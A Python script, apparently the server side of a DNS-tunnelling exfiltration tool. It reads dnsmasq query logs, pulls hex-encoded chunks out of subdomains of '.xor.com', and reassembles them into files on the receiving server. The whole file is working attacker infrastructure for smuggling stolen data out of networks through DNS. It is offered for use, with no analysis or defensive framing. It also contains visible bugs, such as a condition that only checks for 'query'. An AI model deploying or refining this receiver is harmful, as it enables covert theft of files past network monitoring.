import os.path
from binascii import unhexlify
from os import chdir
from time import sleep
from os import getcwd

# This is the script that has to be executed on your DNS server
chdir("/home/todos")  # here you have to specify the path you want to save all the files you get.
print("Here is where all files will be saved: " + getcwd())
globalwarningcount = 0
filename = ""
def creator(pnumber, part):
    global globalwarningcount
    global filename
    print("FILE-------------------------------------> " + filename)
    # This procedure is here also to avoid problem when a duplicate query arrives on our DNS server:
    if int(pnumber) == 0 and not os.path.isfile(unhexlify(part).decode("utf-8")):
        globalwarningcount = 0
        filename = unhexlify(part).decode("utf-8")
        f = open(filename, "a")
        f.write("")
        f.close()
        print(filename + " -> created")
    else:
        if int(pnumber) == 0 and os.path.isfile(unhexlify(part).decode("utf-8")):
            print("File already exist")
            globalwarningcount = int(pnumber) + 1
        else:
            if globalwarningcount > int(pnumber):
                print("this is the piece number: " + pnumber + ", of a file that already exist")
                globalwarningcount = int(pnumber) + 1
            else:
                try:
                    # Not everything need to be decoded (.decode("utf-8"))
                    fc = open(filename, "a")
                    fc.write(unhexlify(part).decode("utf-8"))
                    fc.close()
                    print("File successfully updated")
                    globalwarningcount = int(pnumber) + 1
                except:
                    fc = open(filename, "a")
                    fc.write(unhexlify(part))
                    fc.close()
                    print("File successfully updated")
                    globalwarningcount = int(pnumber) + 1




while True:
    fo = open("/tmp/dnsmasq.log", "r+")  # That is the path where you can read DNS query logs, you need to specify this path in /etc/dnsmasq.conf
    lines = fo.readlines()
    fo.truncate(0)  # so I have delete the content
    fo.close()

    for line in lines:
        sleep(0.3)
        if ".xor.com" and "query" in line:
            print("")
            fnum = line.find(".xor.com", 0, len(line))
            snum = (line.find("x.", 0, fnum))+2
            enpayload = ""
            for x in range(snum, fnum):
                enpayload = enpayload + line[x]

            print("THAT'S THE hexlify PAYLOAD:" + enpayload)
            payload = unhexlify(enpayload)
            print("THAT'S THE unhexlify PAYLOAD: " + payload)
            # NOW WE "UNPACK" THE PAYLOAD:
            fnumm = payload.find("|", 0, len(payload))
            partnumber = ""
            data = ""
            for x in range(0, fnumm):
                    partnumber = partnumber + payload[x]
            for x in range(fnumm + 1, len(payload)):
                    data = data + payload[x]
            print("This is part: " + partnumber)
            print("This is data: " + unhexlify(data))
            creator(partnumber, data)

    sleep(10)







































